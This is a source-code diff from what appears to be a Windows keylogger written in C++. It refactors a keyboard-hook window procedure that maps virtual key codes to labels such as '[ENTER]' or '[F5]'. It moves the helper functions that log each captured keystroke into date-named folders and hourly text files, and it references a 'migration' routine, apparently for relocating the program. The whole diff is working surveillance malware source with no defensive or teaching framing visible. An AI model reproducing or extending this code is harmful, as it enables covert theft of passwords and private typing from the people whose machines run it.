@@ -2,13 +2,14 @@
 #include <iostream>
 #include <windows.h>
 #include <conio.h>
-#include <time.h>
 #include <direct.h>
 #include "../keyloggerDll/keyloggerDll.h"
 
 #define KEYLOGGER_DLL "KeyloggerDll.dll"
 using namespace std;
 extern void migration(char *filepath);
+extern const string currentDateTime(int flags);
+extern int treatKey(string charPressed);
 
 LRESULT CALLBACK WndProc(HWND, UINT, WPARAM, LPARAM);
 typedef void(*PFN_HOOKSTART)(HWND);
@@ -17,34 +18,6 @@ typedef void(*PFN_HOOKSTOP)();
 HINSTANCE g_hInst;
 HHOOK g_hHook = NULL;
 HWND hWnd = NULL;
-
-const string currentDateTime(int flags) {
-	time_t     now = time(0); //현재 시간을 time_t 타입으로 저장
-	struct tm  tstruct;
-	char       buf[80];
-	tstruct = *localtime(&now);
-	if (flags == 1) {
-		strftime(buf, sizeof(buf), "%Y-%m-%d", &tstruct); // YYYY-MM-DD 형태의 스트링
-	}
-	else if (flags == 2) {
-		strftime(buf, sizeof(buf), "%Y-%m-%d-%H.txt", &tstruct); // YYYY-MM-DD-HH 형태의 스트링
-	}
-	
-	return buf;
-}
-
-int treatKey(string charPressed, DWORD key)
-{
-	string Date = currentDateTime(1);	// 하루단위 폴더 생성을 위한 시간 구하기
-	string DateTime = currentDateTime(2);	// 시간단위 파일 생성을 위한 시간 구하기
-	FILE *FP;
-
-	_mkdir(Date.c_str());
-	fopen_s(&FP, (Date +"\\"+ DateTime).c_str(), "a");
-	fprintf(FP, "%s", charPressed.c_str());
-	fclose(FP);
-	return 0;
-}
 
 LRESULT CALLBACK WndProc(HWND hWnd, UINT iMessage, WPARAM wParam, LPARAM lParam)
 {
@@ -79,188 +52,188 @@ LRESULT CALLBACK WndProc(HWND hWnd, UINT iMessage, WPARAM wParam, LPARAM lParam)
 			if (nKey == 0) {
 				nKey = GetAsyncKeyState(VK_SHIFT);
 				if (nKey == 1)
-					treatKey("[SHIFT]", p->vkCode);
+					treatKey("[SHIFT]");
 			}
 			if (p->vkCode == VK_CAPITAL) {
-				treatKey("[CAPSLOCK]", p->vkCode);
+				treatKey("[CAPSLOCK]");
 			}
 			else if (p->vkCode == VK_RETURN) {
-				treatKey("[ENTER]\n", p->vkCode);
+				treatKey("[ENTER]\n");
 			}
 			else if (p->vkCode == VK_TAB) {
-				treatKey("[TAB]", p->vkCode);
+				treatKey("[TAB]");
 			}
 			else if (p->vkCode == VK_SPACE) {
-				treatKey("[SPACE]\x20", p->vkCode);
+				treatKey("[SPACE]\x20");
 			}
 			else if (p->vkCode == VK_CONTROL || p->vkCode == VK_LCONTROL || p->vkCode == VK_RCONTROL) {
-				treatKey("[CTRL]", p->vkCode);
+				treatKey("[CTRL]");
 			}
 			else if (p->vkCode == VK_ESCAPE) {
-				treatKey("[ESC]", p->vkCode);
+				treatKey("[ESC]");
 			}
 			else if (p->vkCode == VK_END) {
-				treatKey("[END]", p->vkCode);
+				treatKey("[END]");
 			}
 			else if (p->vkCode == VK_HOME) {
-				treatKey("[HOME]", p->vkCode);
+				treatKey("[HOME]");
 			}
 			else if (p->vkCode == VK_LEFT) {
-				treatKey("[LEFT]", p->vkCode);
+				treatKey("[LEFT]");
 			}
 			else if (p->vkCode == VK_UP) {
-				treatKey("[UP]", p->vkCode);
+				treatKey("[UP]");
 			}
 			else if (p->vkCode == VK_RIGHT) {
-				treatKey("[RIGHT]", p->vkCode);
+				treatKey("[RIGHT]");
 			}
 			else if (p->vkCode == VK_DOWN) {
-				treatKey("[DOWN]", p->vkCode);
+				treatKey("[DOWN]");
 			}
 			else if (p->vkCode == VK_DELETE) {
-				treatKey("[DELETE]", p->vkCode);
+				treatKey("[DELETE]");
 			}
 			else if (p->vkCode == VK_INSERT) {
-				treatKey("[INSERT]", p->vkCode);
+				treatKey("[INSERT]");
 			}
 			else if (p->vkCode == VK_F1) {
-				treatKey("[F1]", p->vkCode);
+				treatKey("[F1]");
 			}
 			else if (p->vkCode == VK_F2) {
-				treatKey("[F2]", p->vkCode);
+				treatKey("[F2]");
 			}
 			else if (p->vkCode == VK_F3) {
-				treatKey("[F3]", p->vkCode);
+				treatKey("[F3]");
 			}
 			else if (p->vkCode == VK_F4) {
-				treatKey("[F4]", p->vkCode);
+				treatKey("[F4]");
 			}
 			else if (p->vkCode == VK_F5) {
-				treatKey("[F5]", p->vkCode);
+				treatKey("[F5]");
 			}
 			else if (p->vkCode == VK_F6) {
-				treatKey("[F6]", p->vkCode);
+				treatKey("[F6]");
 			}
 			else if (p->vkCode == VK_F7) {
-				treatKey("[F7]", p->vkCode);
+				treatKey("[F7]");
 			}
 			else if (p->vkCode == VK_F8) {
-				treatKey("[F8]", p->vkCode);
+				treatKey("[F8]");
 			}
 			else if (p->vkCode == VK_F9) {
-				treatKey("[F9]", p->vkCode);
+				treatKey("[F9]");
 			}
 			else if (p->vkCode == VK_F10) {
-				treatKey("[F10]", p->vkCode);
+				treatKey("[F10]");
 			}
 			else if (p->vkCode == VK_F11) {
-				treatKey("[F11]", p->vkCode);
+				treatKey("[F11]");
 			}
 			else if (p->vkCode == VK_F12) {
-				treatKey("[F12]", p->vkCode);
+				treatKey("[F12]");
 			}
 			else if (p->vkCode == VK_F13) {
-				treatKey("[F13]", p->vkCode);
+				treatKey("[F13]");
 			}
 			else if (p->vkCode == VK_F14) {
-				treatKey("[F14]", p->vkCode);
+				treatKey("[F14]");
 			}
 			else if (p->vkCode == VK_F15) {
-				treatKey("[F15]", p->vkCode);
+				treatKey("[F15]");
 			}
 			else if (p->vkCode == VK_NUMLOCK) {
-				treatKey("[NUMLOCK]", p->vkCode);
+				treatKey("[NUMLOCK]");
 			}
 			else if (p->vkCode == 106) {
-				treatKey("*", p->vkCode);
+				treatKey("*");
 			}
 			else if (p->vkCode == 186) {
 				if (nKey) {
-					treatKey(":", p->vkCode);
+					treatKey(":");
 					nKey = 0;
 				}
 				else if (!nKey)
-					treatKey(";", p->vkCode);
+					treatKey(";");
 			}
 			else if (p->vkCode == 187 || p->vkCode == 107) {
 				if (nKey) {
-					treatKey("+", p->vkCode);
+					treatKey("+");
 					nKey = 0;
 				}
 				else if (!nKey)
-					treatKey("=", p->vkCode);
+					treatKey("=");
 			}
 			else if (p->vkCode == 188) {
 				if (nKey) {
-					treatKey("<", p->vkCode);
+					treatKey("<");
 					nKey = 0;
 				}
 				else if (!nKey)
-					treatKey(",", p->vkCode);
+					treatKey(",");
 			}
 			else if (p->vkCode == 189 || p->vkCode == 109) {
 				if (nKey) {
-					treatKey("_", p->vkCode);
+					treatKey("_");
 					nKey = 0;
 				}
 				else if (!nKey)
-					treatKey("-", p->vkCode);
+					treatKey("-");
 			}
 			else if (p->vkCode == 190 || p->vkCode == 110) {
 				if (nKey) {
-					treatKey(">", p->vkCode);
+					treatKey(">");
 					nKey = 0;
 				}
 				else if (!nKey)
-					treatKey(".", p->vkCode);
+					treatKey(".");
 			}
 			else if (p->vkCode == 191 || p->vkCode == 111) {
 				if (nKey) {
-					treatKey("?", p->vkCode);
+					treatKey("?");
 					nKey = 0;
 				}
 				else if (!nKey)
-					treatKey("/", p->vkCode);
+					treatKey("/");
 			}
 			else if (p->vkCode == 192) {
 				if (nKey) {
-					treatKey("~", p->vkCode);
+					treatKey("~");
 					nKey = 0;
 				}
 				else if (!nKey)
-					treatKey("`", p->vkCode);
+					treatKey("`");
 			}
 			else if (p->vkCode == 219) {
 				if (nKey) {
-					treatKey("{", p->vkCode);
+					treatKey("{");
 					nKey = 0;
 				}
 				else if (!nKey)
-					treatKey("[", p->vkCode);
+					treatKey("[");
 			}
 			else if (p->vkCode == 221) {
 				if (nKey) {
-					treatKey("}", p->vkCode);
+					treatKey("}");
 					nKey = 0;
 				}
 				else if (!nKey)
-					treatKey("]", p->vkCode);
+					treatKey("]");
 			}
 			else if (p->vkCode == 222) {
 				if (nKey) {
-					treatKey("\"", p->vkCode);
+					treatKey("\"");
 					nKey = 0;
 				}
 				else if (!nKey)
-					treatKey("'", p->vkCode);
+					treatKey("'");
 				}
 			else if (p->vkCode == 226) {
 				if (nKey) {
-					treatKey("|", p->vkCode);
+					treatKey("|");
 					nKey = 0;
 				}
 				else if (!nKey)
-					treatKey("\\", p->vkCode);
+					treatKey("\\");
 					}
 			else {
 				charPressed = (char)p->vkCode;
@@ -343,7 +316,7 @@ LRESULT CALLBACK WndProc(HWND hWnd, UINT iMessage, WPARAM wParam, LPARAM lParam)
 						charPressed = toupper(charPressed);
 						nKey = 0;
 					}
-					treatKey(string(1, charPressed), p->vkCode);
+					treatKey(string(1, charPressed));
 				}
 			}
 			return 0;
